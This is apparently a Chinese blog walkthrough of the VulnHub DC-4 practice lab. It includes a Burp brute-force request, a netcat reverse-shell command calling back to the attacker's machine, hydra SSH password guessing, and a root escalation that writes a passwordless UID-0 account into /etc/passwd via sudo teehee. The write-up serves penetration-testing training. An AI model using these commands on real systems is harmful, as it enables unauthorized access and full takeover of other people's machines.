## 靶机介绍

DC-4 is another purposely built vulnerable lab with the intent of gaining
experience in the world of penetration testing.

Unlike the previous DC releases, this one is designed primarily for
beginners/intermediates. There is only one flag, but technically, multiple
entry points and just like last time, no clues

靶机地址：<https://www.vulnhub.com/entry/dc-4,313/>

这边靶机和前一个是一样的，只需要获取一个`Flag`就行了，在 `/root` 目录下!

## 学习到的知识

`Burpsuite`枚举弱口令`命令执行`反弹shell`hydra`爆破`ssh``teehee`权限提升

## 信息搜集

拿到 `IP` 先对它进行端口扫描：

    
    
    nmap -A -T4 192.168.1.100
    

![图片](https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1206.png)

这边扫描出来靶机开放了 `22`（ssh）、`80`（http）端口，先从 `80` 端口来入侵：

    
    
    http://192.168.1.100/
    

![图片](https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1207.png)

## Burpsuite枚举弱口令

打开后发现是一个登陆的页面，我尝试了常规的弱口令 `admin`、`admin123` 无果，随后我又尝试了一遍 `SQL`
注入，并没有注入点！这个时候就需要掏出我的字典来了来配合 `Burp` 爆破：

    
    
    POST /login.php HTTP/1.1Host: 192.168.1.100User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateReferer: http://192.168.1.100/Content-Type: application/x-www-form-urlencodedContent-Length: 30Connection: closeCookie: PHPSESSID=lddqa4ven9a9qqf8ua9tlurj35Upgrade-Insecure-Requests: 1​username=admin&password=§123456§
    

![图片](https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1208.png)

![图片](https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1209.png)

爆破成功后得到密码 `happy`，随后拿着账号和密码登陆到了后台，在后台发现可以执行查看文件的操作：

![图片](https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1210.png)

## 命令执行反弹shell

这个时候想到了`命令执行`，`whoami` 看了看权限是一个网站普通权限：

![图片](https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1211.png)

我们先用 `nc` 反弹一个 `shell` 回来把，`kali` 监听 `4444` 端口，在 `radio` 变量输入 `nc`
反弹的地址成功反弹一枚shell：

    
    
    nc -e /bin/sh 192.168.1.128 4444
    

![图片](https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1212.png)

我们先让它得到一个 `bash` 把：

    
    
    python -c 'import pty;pty.spawn("/bin/bash")'
    

## hydra爆破ssh

之后我是在 `/home/jim` 目录里发现了一个`历史密码`的`备份文件`：

![图片](https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1213.png)

既然得到了密码，那么就用`九头蛇`来爆破把：

    
    
    hydra -l jim -P pass ssh://192.168.1.100 -t 10
    

![图片](https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1214.png)

爆破成功后得到 `jim` 的密码为 `jibril04`，随后我登陆到了 `jim` 用户：

    
    
    ssh jim@192.168.1.100
    

![图片](https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1215.png)

登陆之后我习惯性的 `sudo -l` 发现需要密码：

![图片](https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1216.png)

紧接着我在 `jim` 的目录下发现了一个文件，文件里好像是一封邮件信息：

    
    
    From root@dc-4 Sat Apr 06 20:20:04 2019Return-path: <root@dc-4>Envelope-to: jim@dc-4Delivery-date: Sat, 06 Apr 2019 20:20:04 +1000Received: from root by dc-4 with local (Exim 4.89)        (envelope-from <root@dc-4>)        id 1hCiQe-0000gc-EC        for jim@dc-4; Sat, 06 Apr 2019 20:20:04 +1000To: jim@dc-4Subject: TestMIME-Version: 1.0Content-Type: text/plain; charset="UTF-8"Content-Transfer-Encoding: 8bitMessage-Id: <E1hCiQe-0000gc-EC@dc-4>From: root <root@dc-4>Date: Sat, 06 Apr 2019 20:20:04 +1000Status: RO​This is a test.​
    

![图片](https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1217.png)

好像没得啥子用处！最后我在邮箱目录找到了另一封邮件：

![图片](https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1218.png)

读完这封邮件我得到了 `charles` 告诉 `jim` 的一个重要信息，也就是 `charles` 的密码！

    
    
    charles：^xHhA&hvim0y
    

获取到密码后我切换到了 `charles` 用户：

    
    
    su charles
    ^xHhA&hvim0y
    

![图片](https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1219.png)

## teehee权限提升

切换用户之后我又是习惯性的 `sudo -l` 发现 `charles` 用户可以以 `root` 身份去运行 `teehee`命令：

![图片](https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1220.png)

我紧接着写入了一个 `saul` 账号到 `passwd` 里：

    
    
    echo "saul::0:0:::/bin/bash" | sudo teehee -a /etc/passwd
    #注释：
    #[用户名]：[密码]：[UID]：[GID]：[身份描述]：[主目录]：[登录shell]
    

![图片](https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1221.png)

最后也是在 `/root` 目录下拿到了 `Flag` ～

